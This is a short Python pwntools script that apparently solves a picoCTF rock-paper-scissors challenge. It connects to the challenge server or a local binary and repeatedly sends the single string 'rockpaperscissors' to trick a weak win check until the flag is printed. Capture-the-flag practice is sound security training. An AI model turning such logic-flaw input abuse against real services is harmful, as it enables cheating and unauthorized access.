from pwn import *
import random
from time import time




def connection():
	if args.REMOTE:
		# saturn.picoctf.net 51420
		url = 'saturn.picoctf.net'
		port = '51420'
		return remote(url, port)
	else:
		url_path = 'a.out'
		elf = ELF(url_path)
		context.log_level = 'debug'
		return elf.process()


def try_to_win(p):
	choices = b'rockpaperscissors'
	res =  p.recvuntil(b'exit the program\r\n')
	p.sendline(b'1')
	p.recvuntil(b'scissors):\r\n')
	p.sendline(choices)
	p.recvuntil(b'Play again?\r\n')
	if b'the flag' in res:
		return res.splitlines()[1].decode()
	else:
		return None
	




p = connection()

flag = None
while not flag:
	flag = try_to_win(p)

log.success(f"FLAG: {flag}")